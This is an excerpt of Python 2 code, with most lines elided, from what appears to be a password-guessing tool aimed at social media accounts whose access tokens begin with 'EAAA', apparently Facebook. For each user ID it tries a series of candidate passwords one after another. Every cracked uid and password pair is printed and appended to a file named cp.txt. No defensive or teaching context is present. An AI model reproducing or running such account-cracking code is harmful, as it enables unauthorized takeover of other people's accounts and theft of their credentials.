    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        ...
                                        print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            ...
                                            print ' \x1b[1;31m[TOR] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
